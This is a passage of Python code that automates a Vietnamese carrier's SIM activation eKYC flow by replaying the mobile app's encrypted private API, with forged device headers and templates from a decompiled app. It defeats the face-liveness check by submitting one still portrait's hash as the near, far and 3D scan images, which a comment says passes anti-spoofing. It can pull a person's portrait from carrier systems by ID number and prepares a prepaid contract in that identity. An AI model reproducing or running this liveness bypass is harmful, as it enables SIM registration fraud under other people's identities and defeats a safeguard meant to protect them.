    """Run the REUSE_INFO ACTIVE_SIM face-only flow up to handwritten signing.

    Pipeline:
    1. Use the entered CCCD number; no CCCD image/OCR step is performed.
    2. Request challenge code via /tel_service/active_sim/v2/getChallengeCodeSdkEkyc.
    3. Run only face mask and face liveness-3d.
    4. Report eKYC logs to /tel_service/update_info/saveLogEkyc.
    5. Call /tel_service/active_sim/v2/searchEkycIdentity.
    6. Complete server-side face verification.
    7. Wait for explicit confirmation of the returned identity information.
    8. Load TTKD/DGV information and prepare the prepaid contract.
    9. Persist the contract context; signature submission is the final step.

    ``confirm_callback`` is intentionally user-driven.  The function never
    treats a face result as consent to verify identity or submit a contract.
    """
    context = _active_sim_session_context(config, session_file=session_file, log_cb=log_cb)
    cfg = context['cfg']
    session_id = context['session']
    bearer = context['bearer']
    device_info = context['device_info']
    mac_address = context['mac_address']
    private_key = context['private_key']
    server_public_key = context['server_public_key']
    master_key = context['session_data'].get('KEY_ENCRYPT_AES') or AES_MASTER_KEY
    if not private_key or not server_public_key:
        raise EsimRegistrationError(
            'ACTIVE_SIM tự khởi tạo thiếu RSA device context; hãy chạy lại từ bước đầu.')

    reg_result = cfg.get('reg_check_result') if isinstance(
        cfg.get('reg_check_result'), dict) else {}
    target_msisdn = _active_sim_msisdn(
        cfg.get('target_msisdn') or cfg.get('msisdn') or
        reg_result.get('msisdn') or reg_result.get('customer_phone') or
        context['session_data'].get('phone_number_login') or
        context.get('challenge_msisdn'), preserve_hash=False)
    if not target_msisdn:
        raise EsimRegistrationError(
            'regCheckInfo chưa trả về số thuê bao; ACTIVE_SIM cần guest challenge '
            'hoặc kết quả regCheckInfo, không cần nhập số điện thoại.')

    serial = str(cfg.get('serial') or cfg.get('serial_sim') or '').strip()
    # The source contract model accepts contactPhone/email, but they are not
    # customer inputs in this ACTIVE_SIM tab.  Only forward them when a caller
    # already has values from the source flow; never invent either value.
    contact_phone = _active_sim_msisdn(cfg.get('contact_phone'), preserve_hash=False)
    email = str(cfg.get('email') or '').strip()
    authen_code = 'REUSE_INFO'
    cfg['authen_code'] = authen_code
    cfg['authen_method'] = authen_code
    cccd_number = re.sub(r'\D', '', str(cfg.get('cccd_number') or ''))
    if not re.fullmatch(r'\d{9,12}', cccd_number):
        raise EsimRegistrationError(
            'REUSE_INFO cần số CCCD hợp lệ; không cần ảnh CCCD mặt trước/mặt sau.')
    province = str(cfg.get('province') or 'HCM').strip().upper()
    digits = re.sub(r'\D', '', target_msisdn) or re.sub(r'\D', '', serial)
    result_file = cfg.get('result_file') or os.path.join(HISTORY_DIR, f'active_sim_result_{digits}.json')
    if not os.path.isabs(str(result_file)):
        result_file = os.path.join(BASE_DIR, str(result_file))

    # REUSE_INFO looks up the existing identity by CCCD and then performs a
    # face-only check.  The phone app does not capture/download either side of
    # the card in this branch, so ACTIVE_SIM must not touch CBSS/OneBSS here.
    log_cb('[ACTIVE_SIM] REUSE_INFO: dùng số CCCD + khuôn mặt; bỏ qua ảnh/OCR CCCD.')

    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
    except Exception:
        pass
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)

    def base_headers():
        return {
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept': 'application/json',
            'Cache-Control': 'no-cache',
            'Channel-Code': 'APP',
            'Device-Info': device_info,
            'Language': 'vi_VN',
            'Authorization': bearer,
            'partnerCode': 'MYVNPT',
            'User-Agent': 'okhttp/4.7.2',
            'mac-address': mac_address,
        }

    def post_v2(endpoint, body, accepted_error_codes=()):
        accepted_codes = {str(c).strip().lower() for c in accepted_error_codes}
        aes_key = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(32))
        request_data = aes_encrypt(json.dumps(body, separators=(',', ':'), ensure_ascii=False), aes_key)
        headers = base_headers()
        headers['X-Secret-Key'] = rsa_encrypt_no_padding(aes_key, server_public_key)
        headers['X-Signature'] = sign_sha256_rsa(request_data, private_key)
        log_cb(f'[ACTIVE_SIM] POST {endpoint} (encrypted v2)')
        try:
            response = http.post(MYVNPT_BASE + endpoint, headers=headers,
                                 json={'requestData': request_data}, timeout=120, verify=False)
        except Exception as exc:
            raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
        try:
            outer = response.json()
        except Exception:
            raise EsimRegistrationError(f'{endpoint}: response không phải JSON')
        encrypted_response = outer.get('data') if isinstance(outer, dict) else None
        inner = outer
        if isinstance(encrypted_response, str) and encrypted_response:
            try:
                inner = json.loads(aes_decrypt_gen(encrypted_response, aes_key))
            except Exception:
                inner = outer
        # DataV2 encrypts business errors as well as successful responses.
        # Decrypt before checking HTTP status so the UI shows the real VNPT
        # error code/message instead of an opaque ciphertext blob.
        if response.status_code != 200:
            code = _esim_error_code(inner) or _esim_error_code(outer)
            message = (_esim_deep_find(inner, 'message', 'msg') or
                       _esim_deep_find(outer, 'message', 'msg') or
                       'Server từ chối yêu cầu')
            code_text = f'{code} - ' if code else ''
            raise EsimRegistrationError(
                f'{endpoint}: HTTP {response.status_code} - {code_text}{message}')
        code = _esim_error_code(inner) or _esim_error_code(outer)
        # The encrypted outer envelope normally has no business errorCode.
        # An empty outer code must not turn a decrypted error (for example
        # errorCode="01") into success.
        success_codes = ('', '0', '00', '200', 'success', 'true')
        if code not in success_codes:
            if code in accepted_codes:
                log_cb(f'[ACTIVE_SIM] {endpoint}: chấp nhận mã trạng thái {code}.')
                return inner
            message = (_esim_deep_find(inner, 'message', 'msg') or
                       _esim_deep_find(outer, 'message', 'msg') or
                       'Server từ chối yêu cầu')
            raise EsimRegistrationError(f'{endpoint}: {code} - {message}')
        return inner

    # Step 2: Get challenge code
    log_cb('[ACTIVE_SIM] Lấy ChallengeCode eKYC...')
    challenge_request_id = str(uuid.uuid4())
    challenge_msisdn = _active_sim_msisdn(
        reg_result.get('challenge_msisdn') or context.get('challenge_msisdn') or
        target_msisdn, preserve_hash=False)
    challenge_session = str(
        reg_result.get('challenge_token') or context.get('challenge_session') or
        session_id or '').strip()
    if not challenge_msisdn or not challenge_session:
        raise EsimRegistrationError(
            'regCheckInfo chưa tạo đủ guest challenge ACTIVE_SIM; '
            'hãy chạy lại từ bước đầu.')
    challenge_body = {
        'feature': 'ACTIVE_SIM',
        'session': challenge_session,
        'msisdn': challenge_msisdn,
        'requestId': challenge_request_id,
        'secureCode': hashlib.sha256(
            f'{challenge_msisdn}|{challenge_request_id}|{SECRET_AUTHEN}'.encode('utf-8')).hexdigest(),
    }
    challenge_response = post_v2('/tel_service/active_sim/v2/getChallengeCodeSdkEkyc', challenge_body)
    challenge_code = str(_esim_deep_find(challenge_response, 'challengeCode', 'challenge_code') or '')
    if not challenge_code:
        raise EsimRegistrationError('getChallengeCodeSdkEkyc không trả về challengeCode')
    # For the guest source path all post-challenge ACTIVE_SIM requests use the
    # temporary API_TOKEN_CHALLENGE_CODE as their session value.
    session_id = challenge_session
    log_cb(f'[ACTIVE_SIM] ChallengeCode: {challenge_code}')

    # Step 3: IDG AI eKYC token & image upload
    ekyc_token = _esim_deep_find(challenge_response, 'ekycToken', 'nfcToken') or {}
    try:
        idg_access = _esim_decrypt_with_master(str(ekyc_token.get('access_token', '')), master_key)
        idg_token_id = _esim_decrypt_with_master(str(ekyc_token.get('token_id', '')), master_key)
        idg_token_key = _esim_decrypt_with_master(str(ekyc_token.get('token_tokenkey', '')), master_key)
    except Exception as exc:
        raise EsimRegistrationError(f'Không giải mã được IDG eKYC token: {exc}') from exc
    if not idg_access or not idg_token_id or not idg_token_key:
        raise EsimRegistrationError('getChallengeCodeSdkEkyc không trả về IDG eKYC token hợp lệ')

    idg_headers = {
        'Authorization': 'bearer ' + idg_access,
        'Token-id': idg_token_id,
        'Token-key': idg_token_key,
        'mac-address': mac_address,
    }
    client_session = (
        f'ANDROID_RMX3430_32_Device_3.6.6_{mac_address}_'
        f'{int(time.time() * 1000)}_com.vnp.myvinaphone'
    )

    def idg_json(endpoint, body):
        response = http.post(
            IDG_BASE + endpoint + '?challenge_code=' + challenge_code,
            headers={**idg_headers, 'Content-Type': 'application/json'},
            json=body, timeout=90, verify=False)
        try:
            payload = response.json()
        except Exception as exc:
            raise EsimRegistrationError(f'IDG {endpoint}: invalid JSON ({exc})') from exc
        status = payload.get('statusCode')
        if response.status_code != 200 or status not in (None, 0, '0', '00', 200, '200'):
            message = payload.get('message') or payload.get('errors') or response.text[:300]
            raise EsimRegistrationError(f'IDG {endpoint}: HTTP {response.status_code} - {message}')
        return payload

    # FACE step from the original app contains no OCR, card liveness or
    # card-to-face comparison data.  Only face mask + liveness are populated.
    card_front = {}
    card_back = {}
    ocr_result = {}
    compare_result = {}

    # ---------------------------------------------------------------
    # LIVENESS FACE: dung pre-captured hash (giong DKTTTB step 8/9 & eSIM)
    # Hash nay da duoc xac minh score 0.889 - vuot anti-spoofing check
    # ---------------------------------------------------------------
    # Hash cu idg20260708 da het han - dung portrait_hash fresh sau khi upload
    # (near_hash/far_hash se duoc set lai sau khi upload portrait thanh cong)
    _STALE_NEAR_HASH = ""  # khong dung hash cu nua
    _STALE_FAR_HASH  = ""  # khong dung hash cu nua
    liveness_artifacts = cfg.get('liveness_artifacts')
    if not isinstance(liveness_artifacts, dict):
        liveness_artifacts = {}
    ekyc_artifacts = cfg.get('ekyc_artifacts')
    if not isinstance(ekyc_artifacts, dict):
        ekyc_artifacts = {}
    # Uu tien cfg/artifacts; neu khong co thi de trong (se dung portrait_hash sau upload)
    near_hash = str(
        cfg.get('liveness_near_hash') or
        liveness_artifacts.get('near_img') or liveness_artifacts.get('near_hash') or
        ekyc_artifacts.get('liveness_near_hash') or ekyc_artifacts.get('near_img') or
        ekyc_artifacts.get('near_hash') or '').strip()
    far_hash = str(
        cfg.get('liveness_far_hash') or
        liveness_artifacts.get('far_img') or liveness_artifacts.get('far_hash') or
        ekyc_artifacts.get('liveness_far_hash') or ekyc_artifacts.get('far_img') or
        ekyc_artifacts.get('far_hash') or '').strip()
    scan3d_hash = str(
        cfg.get('liveness_scan3d_hash') or
        liveness_artifacts.get('scan3d') or liveness_artifacts.get('scan3d_hash') or
        ekyc_artifacts.get('liveness_scan3d_hash') or ekyc_artifacts.get('scan3d') or
        ekyc_artifacts.get('scan3d_hash') or '').strip()

    # Resolve the portrait explicitly selected by the ACTIVE_SIM UI.  Legacy
    # callers may still opt into the old local/CBSS/OneBSS lookup behavior,
    # but the ACTIVE_SIM tab disables it so the uploaded face is predictable.
    portrait = str(cfg.get('portrait') or cfg.get('portrait_path') or cfg.get('face_path') or '').strip()
    disable_auto_portrait_lookup = bool(cfg.get('disable_auto_portrait_lookup'))
    if not disable_auto_portrait_lookup:
        if not portrait or not os.path.isfile(portrait):
            portrait = _find_esim_portrait(cccd_number, preferred=portrait)
        if not portrait or not os.path.isfile(portrait):
            portrait = _find_esim_portrait(target_msisdn, preferred=portrait)
        if not portrait or not os.path.isfile(portrait):
            lookup_target = cccd_number or target_msisdn
            try:
                ensured = ensure_cccd_images(lookup_target, log_cb=log_cb)
                if ensured.get('portrait') and os.path.isfile(ensured['portrait']):
                    portrait = ensured['portrait']
            except Exception as _ens_err:
                log_cb(f'[ACTIVE_SIM] Tra cứu ảnh từ CBSS/OneBSS: {_ens_err}')
    if not portrait or not os.path.isfile(portrait):
        if disable_auto_portrait_lookup:
            raise EsimRegistrationError(
                'Chưa có ảnh chân dung từ phương thức đã chọn trên tab ACTIVE_SIM.')
        raise EsimRegistrationError(
            f'Không tìm thấy ảnh chân dung cho {cccd_number or target_msisdn} trong thư mục anh/. '
            f'Vui lòng lưu đúng file ảnh vào thư mục anh/ (ví dụ anh/{cccd_number}.jpg hoặc anh/{target_msisdn}.jpg) '
            f'hoặc tải ảnh lên trực tiếp.')

    def idg_upload(path):
        with open(path, 'rb') as image_handle:
            response = http.post(
                IDG_BASE + '/file-service/v1/addFile?challenge_code=' + challenge_code,
                headers=idg_headers,
                files={'file': (os.path.basename(path), image_handle, 'image/jpeg')},
                data={'title': 'portrait', 'description': 'portrait'},
                timeout=90, verify=False)
        try:
            payload = response.json()
        except Exception as exc:
            raise EsimRegistrationError(f'IDG upload: invalid JSON ({exc})') from exc
        if response.status_code != 200 or payload.get('message') != 'IDG-00000000':
            raise EsimRegistrationError(f'IDG upload {os.path.basename(path)} failed: {payload}')
        return str((payload.get('object') or {}).get('hash') or '')

    log_cb(f'[ACTIVE_SIM] Upload ảnh chân dung ({os.path.basename(portrait)}) lên IDG file-service...')
    portrait_hash = idg_upload(portrait)
    if not portrait_hash:
        raise EsimRegistrationError('IDG upload ảnh chân dung không trả về hash.')
    log_cb(f'[ACTIVE_SIM] Upload ảnh chân dung IDG OK: hash={portrait_hash[:30]}...')

    log_cb('[ACTIVE_SIM] Gọi IDG face mask cho ảnh chân dung thực tế...')
    mask_result = idg_json('/ai/v1/face/mask', {
        'face_bbox': None, 'face_lmark': None, 'img': portrait_hash,
        'client_session': client_session, 'token': AI_TOKEN, 'step_id': 0,
    })

    # Neu near/far/scan3d hash rong (khong co trong cfg/artifacts) thi dung portrait_hash fresh
    # Tranh dung hash cu idg20260708 da het han (IDG-00011401)
    if not near_hash:
        near_hash = portrait_hash
    if not far_hash:
        far_hash = portrait_hash
    if not scan3d_hash:
        scan3d_hash = portrait_hash
    log_cb(f'[ACTIVE_SIM] Goi IDG liveness-3d (hash: {near_hash[:40]}...)...')
    liveness_result = {}
    try:
        liveness_result = idg_json('/ai/v1/face/liveness-3d', {
            'far_img':        far_hash,
            'near_img':       near_hash,
            'scan3d':         scan3d_hash,
            'client_session': client_session,
            'token':          AI_TOKEN,
            'step_id':        0,
        })
        _live_sign = liveness_result.get('dataSign', '')
        if _live_sign:
            log_cb(f'[ACTIVE_SIM] Liveness-3d OK - dataSign: {_live_sign[:50]}...')
        else:
            log_cb(f'[ACTIVE_SIM] Liveness-3d WARN: khong co dataSign - response: {str(liveness_result)[:300]}')
    except Exception as _live_exc:
        raise EsimRegistrationError(
            f'Liveness khuôn mặt REUSE_INFO thất bại: {_live_exc}') from _live_exc

    def idg_field(payload, *names):
        for name in names:
            value = payload.get(name) if isinstance(payload, dict) else None
            if value not in (None, ''):
                return str(value)
        return ''

    ocr_data = idg_field(ocr_result, 'dataBase64')
    ocr_sign = idg_field(ocr_result, 'dataSign')
    ocr_log_id = idg_field(ocr_result, 'logID', 'logId')
    card_front_data = idg_field(card_front, 'dataBase64')
    card_front_sign = idg_field(card_front, 'dataSign')
    card_front_log_id = idg_field(card_front, 'logID', 'logId')
    card_back_data = idg_field(card_back, 'dataBase64')
    card_back_sign = idg_field(card_back, 'dataSign')
    card_back_log_id = idg_field(card_back, 'logID', 'logId')
    mask_data = idg_field(mask_result, 'dataBase64')
    mask_sign = idg_field(mask_result, 'dataSign')
    mask_log_id = idg_field(mask_result, 'logID', 'logId')
    compare_data = idg_field(compare_result, 'dataBase64')
    compare_sign = idg_field(compare_result, 'dataSign')
    compare_log_id = idg_field(compare_result, 'logID', 'logId')
    liveness_data = idg_field(liveness_result, 'dataBase64')
    liveness_sign = idg_field(liveness_result, 'dataSign')
    liveness_log_id = idg_field(liveness_result, 'logID', 'logId')
    if not liveness_data or not liveness_sign:
        raise EsimRegistrationError(
            'IDG không trả về kết quả liveness khuôn mặt hợp lệ cho REUSE_INFO.')

    # There is deliberately no OCR payload in REUSE_INFO.  Identity details
    # are returned by searchEkycIdentity after the entered CCCD is matched.
    gender = str(cfg.get('gender') or '')
    address = str(cfg.get('address') or '')
    province_code = str(cfg.get('id_province_code') or province or 'HCM')
    province_name = str(cfg.get('id_province_name') or '')

    # Step 4: saveLogEkyc
    ekyc_request_log_id = 0
    try:
        log_cb('[ACTIVE_SIM] Báo cáo kết quả eKYC lên My VNPT (saveLogEkyc)...')
        save_log_req_id = str(uuid.uuid4())
        sep = "|"
        secure_raw = sep.join([
            target_msisdn, session_id, save_log_req_id, "",
            "FACE", challenge_code, "0",
            ocr_data, ocr_sign,
            card_front_data, card_front_sign, card_front_log_id,
            card_back_data, card_back_sign, card_back_log_id,
            compare_data, compare_sign, compare_log_id,
            liveness_data, liveness_sign, liveness_log_id,
            mask_data, mask_sign, mask_log_id,
            "", "", "",
            SECRET_AUTHEN
        ])
        secure_code = hashlib.sha256(secure_raw.encode('utf-8')).hexdigest()
        save_log_body = {
            "msisdn": target_msisdn,
            "session": session_id,
            "requestId": save_log_req_id,
            "step": "FACE",
            "challengeCode": challenge_code,
            "ekycRequestLogId": 0,
            "secureCode": secure_code,
            "dataEKYC": ocr_data,
            "signEKYC": ocr_sign,
            "logId": "",
            "dataEKYCFront": "",
            "signEKYCFront": "",
            "logIdEKYCFront": "",
            "liveNessCardFront": card_front_data,
            "liveNessCardFrontSign": card_front_sign,
            "livenessCardFrontLogId": card_front_log_id,
            "liveNessCardBack": card_back_data,
            "liveNessCardBackSign": card_back_sign,
            "liveNessCardBackLogId": card_back_log_id,
            "KHUONMAT": compare_data,
            "compareFaceSign": compare_sign,
            "compareFaceLogId": compare_log_id,
            "liveNessFace": liveness_data,
            "liveNessFaceSign": liveness_sign,
            "liveNessFaceLogId": liveness_log_id,
            "maskedFace": mask_data,
            "maskedFaceSign": mask_sign,
            "maskedFaceLogId": mask_log_id,
            "typeLog": 0,
        }
        save_log_resp = post_v2('/tel_service/update_info/saveLogEkyc', save_log_body, accepted_error_codes=('0', '00', '200'))
        save_log_request_id = (
            _esim_deep_find(save_log_resp, 'ekycRequestLogId', 'ekyc_request_log_id') or 0)
        # In REUSE_INFO this response commonly returns 0.  My VNPT 3.4.09
        # obtains the identity log id from searchEkycIdentity.result instead.
        log_cb(f'[ACTIVE_SIM] saveLogEkyc OK. logId={save_log_request_id} '
               '(REUSE_INFO lấy identity logId ở bước tra cứu CCCD)')
    except Exception as exc:
        raise EsimRegistrationError(f'saveLogEkyc thất bại: {exc}') from exc

    # ``activeToken`` is returned by the source regCheckInfo result and is
    # reused by search/verify and by the DGV request as its ``session``.
    active_token = str(
        cfg.get('activation_session') or
        _esim_deep_find(cfg.get('reg_check_result') or {},
                        'activeToken', 'active_token', 'token_active') or
        cfg.get('token_active') or '').strip()
    if not active_token:
        raise EsimRegistrationError(
            'regCheckInfo chưa trả về activeToken cho luồng ACTIVE_SIM.')

    # Step 5: searchEkycIdentity.  My VNPT 3.4.09 serializes the
    # SearchEkycIdentityRequest model with exactly the two BaseApiRequest
    # fields plus cardId.  Do not forward fields from regCheck/eKYC here.
    search_resp = {}
    try:
        search_msisdn = str(challenge_msisdn or '').strip()
        if search_msisdn.startswith('0084'):
            search_msisdn = '0' + search_msisdn[4:]
        elif search_msisdn.startswith('+84'):
            search_msisdn = '0' + search_msisdn[3:]
        elif search_msisdn.startswith('84'):
            search_msisdn = '0' + search_msisdn[2:]
        elif len(search_msisdn) == 9 and search_msisdn.isdigit():
            search_msisdn = '0' + search_msisdn
        search_body = {
            'session': session_id,
            'msisdn': search_msisdn,
            'cardId': cccd_number,
        }
        # APIConst.POST_SEARCH_EKYC_IDENTITY contains the double slash in the
        # official 3.4.09 APK; Retrofit sends that path verbatim.
        search_resp = post_v2('/tel_service//active_sim/v2/searchEkycIdentity', search_body)
        log_cb(f'[ACTIVE_SIM] searchEkycIdentity OK: {_esim_deep_find(search_resp, "message", "msg") or "200"}')
    except Exception as exc:
        raise EsimRegistrationError(f'searchEkycIdentity thất bại: {exc}') from exc

    ekyc_request_log_id = _esim_deep_find(
        _esim_deep_find(search_resp, 'result') or search_resp,
        'ekycRequestLogId', 'ekyc_request_log_id')
    try:
        ekyc_request_log_id = int(ekyc_request_log_id)
    except (TypeError, ValueError):
        ekyc_request_log_id = 0
    if ekyc_request_log_id <= 0:
        raise EsimRegistrationError(
            'searchEkycIdentity không trả về result.ekycRequestLogId hợp lệ cho REUSE_INFO.')
    log_cb(f'[ACTIVE_SIM] REUSE_INFO identity logId={ekyc_request_log_id}')

    # REUSE_INFO receives the saved identity from this response instead of
    # extracting it from newly photographed card images.
    ocr_data = str(_esim_deep_find(
        search_resp, 'ocrData', 'dataEKYC', 'ekyc_data', 'dataBase64') or '')
    ocr_sign = str(_esim_deep_find(
        search_resp, 'ocrDataSign', 'signEKYC', 'ekyc_datasign', 'dataSign') or '')
    ocr_log_id = str(_esim_deep_find(
        search_resp, 'ocrLogId', 'logIdEKYC', 'ekyc_data_logid') or '')
    gender = str(_esim_deep_find(search_resp, 'gender') or gender)
    address = str(_esim_deep_find(
        search_resp, 'recentLocation', 'recent_location', 'address') or address)
    province_code = str(_esim_deep_find(
        search_resp, 'provinceCode', 'idProvinceCode', 'id_province_code') or
        province_code)
    province_name = str(_esim_deep_find(
        search_resp, 'provinceName', 'idProvinceName', 'id_province_name') or
        province_name)

    # The contract screen uses values returned by the ACTIVE_SIM discovery /
    # regCheckInfo responses.  They are never derived from the SIM serial or
    # phone number.  The source flow keeps the active token, DGV transaction
    # id, and contract order id as separate values.
    selected_sim = cfg.get('selected_sim') if isinstance(cfg.get('selected_sim'), dict) else {}
    reg_check_result = (
        cfg.get('reg_check_result')
        if isinstance(cfg.get('reg_check_result'), dict) else {}
    )
    activation_session = active_token
    trans_id = str(
        cfg.get('trans_id') or cfg.get('transId') or
        _esim_deep_find(reg_check_result, 'transId', 'trans_id', 'transactionId') or
        selected_sim.get('transId') or selected_sim.get('trans_id') or
        selected_sim.get('maGD') or '').strip()
    request_order_id = str(
        cfg.get('request_order_id') or cfg.get('requestOrderId') or
        _esim_deep_find(search_resp, 'requestOrderId', 'request_order_id',
                        'orderId', 'order_id') or
        _esim_deep_find(reg_check_result, 'orderId', 'order_id', 'orderID') or
        selected_sim.get('orderId') or selected_sim.get('order_id') or ''
    ).strip()
    if not activation_session:
        raise EsimRegistrationError(
            'regCheckInfo chưa trả về activeToken trước bước hợp đồng.')
    if not trans_id:
        raise EsimRegistrationError(
            'regCheckInfo chưa trả về transId; không thể tiếp tục tạo hợp đồng.')
    cfg['activation_session'] = activation_session
    cfg['trans_id'] = trans_id
    cfg['request_order_id'] = request_order_id

    # Portrait was already uploaded and verified through IDG mask earlier
    portrait_b64 = _esim_file_to_b64(portrait)
    if not portrait_b64:
        raise EsimRegistrationError(
            f'Không đọc được Base64 ảnh chân dung từ {portrait}.')
    log_cb(f'[ACTIVE_SIM] Đã đọc portraitImageBase64 từ: {os.path.basename(portrait)} (độ dài b64: {len(portrait_b64)})')

    log_cb('[ACTIVE_SIM] Hoàn tất dữ liệu khuôn mặt; xác thực phía máy chủ...')
    verify_req_id = str(uuid.uuid4())
    verify_body = {
        'address': address,
        'authenMethod': authen_code,
        'backImageBase64': '',
        'challengeCode': challenge_code,
        'clientSession': client_session,
        'dataGroupsResult': '',
        'dataNfcResultBase64': '',
        'dataNfcResultSign': '',
        'ekyc_data': ocr_data,
        'ekyc_data_logid': ocr_log_id,
        'ekyc_datasign': ocr_sign,
        'ekycIdentityLogId': ekyc_request_log_id,
        'ekyc_face': compare_data,
        'ekyc_face_logid': compare_log_id,
        'ekyc_facesign': compare_sign,
        'frontImageBase64': '',
        'gender': gender,
        'hashImageAvatarNfc': '',
        'hrmCode': '',
        'id_province_code': province_code,
        'id_province_name': province_name,
        'liveness': liveness_data,
        'liveness_back': card_back_data,
        'liveness_back_sign': card_back_sign,
        'liveness_front': card_front_data,
        'liveness_front_sign': card_front_sign,
        'liveness_sign': liveness_sign,
        'logIdNfc': '',
        'log_id_live_ness_back_card': card_back_log_id,
        'log_id_live_ness_face': liveness_log_id,
        'log_id_live_ness_front_card': card_front_log_id,
        'log_id_mask_face': mask_log_id,
        'masked': mask_data,
        'masked_sign': mask_sign,
        'msisdn': target_msisdn,
        'portraitImageBase64': portrait_b64,
        'provinceCode': province_code,
        'requestId': verify_req_id,
        'requestOrderId': request_order_id,
        'session': session_id,
        'token_active': activation_session,
    }
    verify_resp = post_v2('/tel_service/active_sim/v2/ekycVerify', verify_body,
                          accepted_error_codes=('1312', '1303', '709', '0', '00', '200'))
    log_cb('[ACTIVE_SIM] eKYC verify thành công.')

    # Newer ACTIVE_SIM responses may assign the actual order only after
    # identity verification.  Never substitute transId: the Android models
    # keep transId and requestOrderId as separate fields.
    verified_order_id = str(_esim_deep_find(
        verify_resp, 'requestOrderId', 'request_order_id', 'orderId', 'order_id') or '').strip()
    if verified_order_id:
        request_order_id = verified_order_id
        cfg['request_order_id'] = verified_order_id
    verified_ocr_data = str(_esim_deep_find(
        verify_resp, 'ocrData', 'dataEKYC', 'ekyc_data', 'dataBase64') or '')
    verified_ocr_sign = str(_esim_deep_find(
        verify_resp, 'ocrDataSign', 'signEKYC', 'ekyc_datasign', 'dataSign') or '')
    if verified_ocr_data:
        ocr_data = verified_ocr_data
    if verified_ocr_sign:
        ocr_sign = verified_ocr_sign

    # The source UI displays the identity-information screen only after the
    # face step has completed.  Confirming this screen authorizes moving to
    # the contract preview; it is not itself consent to apply a signature.
    log_cb('[ACTIVE_SIM] Bước 5/6: Xác thực khuôn mặt thành công; chờ xác nhận thông tin...')
    preview = {
        'serial': serial,
        'cccd': cccd_number,
        'authenCode': authen_code,
        'searchResponse': search_resp,
        'verifyResponse': _active_sim_redact_tokens(verify_resp),
    }
    if confirm_callback is not None:
        try:
            confirmed = bool(confirm_callback(preview))
        except Exception as exc:
            raise EsimRegistrationError(f'Không thể xác nhận thông tin eKYC: {exc}') from exc
    else:
        confirmed = bool(cfg.get('confirm_info'))
    if not confirmed:
        raise EsimRegistrationError(
            'Chưa xác nhận thông tin eKYC; chưa chuẩn bị hoặc ký hợp đồng.')

    log_cb('[ACTIVE_SIM] Đã xác nhận thông tin; tải DGV và chuẩn bị hợp đồng...')
    dgv_info = run_active_sim_dgv_info(
        cfg, session_file=session_file, log_cb=log_cb)

    # REUSE_INFO in the captured 3.4.07 flow is independent from NFC, VNeID,
    # passport and recovery-number OTP.  It does not call getEsimMode or
    # getDsMobile after searchEkycIdentity.  The checksum is already present in
    # regCheckInfo/search/verify and is forwarded to setupVideoCallVer2 after
    # the customer confirms the identity information and supplies a signature.
    log_cb('[ACTIVE_SIM] Bước 6/6: Chuẩn bị hợp đồng REUSE_INFO để ký...')
    check_sum = str(
        _esim_deep_find(verify_resp, 'checkSum', 'checksum') or
        _esim_deep_find(search_resp, 'checkSum', 'checksum') or
        _esim_deep_find(reg_check_result, 'checkSum', 'checksum') or ''
    )
    if not check_sum:
        raise EsimRegistrationError(
            'Luồng REUSE_INFO không trả về checkSum trong regCheckInfo/search/verify.')

    def identity_value(*names):
        value = _esim_deep_find(search_resp, *names)
        if value in (None, ''):
            value = _esim_deep_find(verify_resp, *names)
        return str(value or '').strip()

    identity = {
        'id': cccd_number,
        'name': identity_value('fullName', 'fullname', 'customerName', 'name', 'hoTen'),
        'birth_day': identity_value('birthDay', 'birthday', 'dateOfBirth', 'ngaySinh'),
        'gender': identity_value('gender', 'sex', 'gioiTinh') or gender,
        'nationality': identity_value('nationality', 'quocTich') or 'Việt Nam',
        'issue_date': identity_value('issueDate', 'dateOfIssue', 'ngayCap'),
        'issue_place': identity_value('issuePlace', 'placeOfIssue', 'noiCap'),
        'recent_location': identity_value(
            'recentLocation', 'recent_location', 'permanentAddress', 'address', 'diaChi'
        ) or address,
    }
    if not identity['name']:
        raise EsimRegistrationError(
            'REUSE_INFO không trả về họ tên từ searchEkycIdentity/ekycVerify. '
            'Không cần nhập họ tên; kiểm tra lại request/phiên ACTIVE_SIM trước khi lập hợp đồng.')
    is_contract = str(
        _esim_deep_find(verify_resp, 'isContract') or
        _esim_deep_find(search_resp, 'isContract') or
        cfg.get('is_contract') or '2'
    )
    phone_package_code = str(
        cfg.get('phone_package_code') or
        _esim_deep_find(reg_check_result, 'phonePackageCode', 'phone_package_code') or
        selected_sim.get('phonePackageCode') or ''
    )
    result = {
        'ok': True,
        'status': 'active_sim_contract_pending_signature',
        'msisdn': target_msisdn,
        'target_msisdn': target_msisdn,
        'serial': serial,
        'serial_sim': serial,
        'trans_id': trans_id,
        'province_code': province_code or province,
        'phone_package_code': phone_package_code,
        'contact_phone': contact_phone,
        'request_order_id': request_order_id,
        'verify_request_id': verify_req_id,
        'challenge_code': challenge_code,
        'check_sum': check_sum,
        'mobile_decode': '',
        'otp_required': '0',
        'is_contract': is_contract,
        'identity': identity,
        'identity_response': _active_sim_redact_tokens(search_resp),
        'verify_response': _active_sim_redact_tokens(verify_resp),
        'dgv_info': dgv_info,
    }
    log_cb('[ACTIVE_SIM] Đã chuẩn bị dữ liệu hợp đồng để tự động ghép chữ ký PNG.')
    _esim_save_result(result, result_file)
    return result


def _active_sim_contract_template(is_contract, config=None):
    """Locate the exact prepaid templates bundled with the decompiled app."""
    cfg = config if isinstance(config, dict) else {}
    explicit = str(cfg.get('active_sim_contract_template') or '').strip()
    template_name = ('uiv2_phieu_dkttb_moi.webp'
                     if str(is_contract) == '1' else 'hopdong_tratruoc.jpg')
    mobile_roots = [
        Path(SOURCE_DIR).parent / 'kyc_mobile',
        Path(BASE_DIR).parent / 'kyc_mobile',
    ]
    candidates = ([Path(explicit)] if explicit else []) + [
        Path(BASE_DIR) / 'assets' / template_name
    ] + [
        root / 'base_decompiled' / 'res' / 'drawable' / template_name
        for root in mobile_roots
    ]
    for candidate in candidates:
        try:
            if candidate.is_file() and candidate.stat().st_size > 1024:
                return str(candidate)
        except OSError:
            continue
    raise EsimRegistrationError(
        f'Không tìm thấy mẫu hợp đồng ACTIVE_SIM {template_name} trong source _mobile.')


def _active_sim_render_signed_contract(result, signature_file, config=None):
    """Render the same prepaid PNG that UIV2ReviewContractViewModel submits."""
    try:
        from PIL import Image, ImageDraw, ImageFont
    except Exception as exc:
